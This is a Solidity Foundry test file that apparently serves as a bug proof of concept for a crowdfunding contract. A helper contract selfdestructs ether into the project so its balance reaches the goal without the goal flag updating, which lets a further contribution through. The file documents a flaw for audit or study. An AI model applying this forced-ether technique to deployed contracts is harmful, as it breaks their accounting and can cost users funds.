// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/Project.sol";
import "src/ProjectFactory.sol";

contract OpixBugPocs is Test {



    ProjectFactory projectFactory;
    Project project;
    address creator;
    address contributor;
    address hacker;
    function setUp() public {

        projectFactory = new ProjectFactory();
        creator = address(0x1);
        contributor = address(0x2);
        hacker = address(0x3);
        vm.deal(contributor, 150 ether);
        vm.deal(hacker, 1 ether);
        vm.startPrank(creator);
        project = Project(projectFactory.create(100 ether, "Test", "TST"));
        vm.stopPrank();


    }

    function test_OverContribute() public {

        // If a contract selfdestructs into the project, the project,
        // it never gets to update it's goal status, so even if the goal will be achieved by the selfdestruct contract, one more contribution will be allowed, which is against the spec.

        OverContributionContract overContributionContract = new OverContributionContract();
        vm.deal(address(overContributionContract), 100 ether); // Give the contract enough money to selfdestruct into the project, and reach the goal.
        // The contract will selfdestruct into the project, and the project will have 100 ether.
        overContributionContract.destroy(payable(address(project)));

        vm.startPrank(contributor);
        // Contributor can contribute ether, even after the goal is already achieved.
        project.contribute{value: 5 ether}();
        vm.stopPrank();
        console.log("project.balance = ", address(project).balance);
        assertTrue(address(project).balance > 100 ether, "Over contribution failed");
    } 



}



contract OverContributionContract{

    function destroy(address payable victim) external {
        selfdestruct(payable(victim));    
    }

}   
